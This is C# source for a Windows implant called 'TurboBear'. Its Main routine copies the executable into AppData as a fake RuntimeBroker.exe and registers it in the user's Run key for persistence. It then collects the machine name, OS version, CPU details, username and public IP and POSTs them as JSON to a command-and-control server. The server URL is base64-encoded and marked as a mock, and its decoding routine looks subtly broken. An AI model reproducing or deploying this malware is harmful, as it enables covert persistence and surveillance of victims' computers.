using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;

namespace TurboBear
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern bool FreeConsole();
        
        private static int crypto_key = 0x1337;
        private static String server = "aHR0cHM6Ly9hYmNkZWYK"; // Mock
        
        static string EncryptString(string buffer)
        {
            int day_key = DateTime.Today.Day;
            string encrypted_buffer = String.Empty;

            foreach (char c in buffer)
            {
                encrypted_buffer += (char)(c + crypto_key);
            }

            var textbytes = Encoding.UTF8.GetBytes(encrypted_buffer);
            return Convert.ToBase64String(textbytes);
        }

        static string DecryptString(string buffer)
        {
            var base64_encoded = Convert.FromBase64String(buffer);
            string buffer_to_process = Encoding.UTF8.GetString(base64_encoded);
            string decrypted_buffer = String.Empty;

            foreach (char c in buffer_to_process)
            {
                decrypted_buffer += (char)(c - crypto_key);
            }

            return decrypted_buffer;
        }

        static void PerformHttpRequest(string url)
        {
            var wb = new WebClient();
            var response = wb.DownloadString(url);
        }
   
        static Dictionary<string, string> GetComputerInfo()
        {
            Dictionary<string, string> system_info = new Dictionary<string, string>();

            system_info.Add("computer_name", Environment.MachineName);
            system_info.Add("windows_version", Environment.OSVersion.ToString());
            system_info.Add("logical_cpus", Environment.ProcessorCount.ToString());
            system_info.Add("cpu_clock", Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "~MHz", 0).ToString());
            system_info.Add("logged_username", Environment.UserName);
            system_info.Add("public_ip", new WebClient().DownloadString("https://api.ipify.org"));

            return system_info;
        }

        static void SendComputerInfoToC2(Dictionary<string, string> computer_info)
        {   

                var httpWebRequest = (HttpWebRequest)WebRequest.Create(DecryptString(server));
                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";

                string json = new JavaScriptSerializer().Serialize(computer_info);

                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    streamWriter.Write(json);
                    streamWriter.Flush();
                    streamWriter.Close();
                }

                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();
                }
        }

        static void MakePersistent()
        {
            string new_app_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\RuntimeBroker.exe";
            File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, new_app_path, true);
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Windows Runtime Broker", "\"" + new_app_path + "\"");
        }

        static void Main(string[] args)
        {
            MakePersistent();
            SendComputerInfoToC2(GetComputerInfo());
        }
    }
}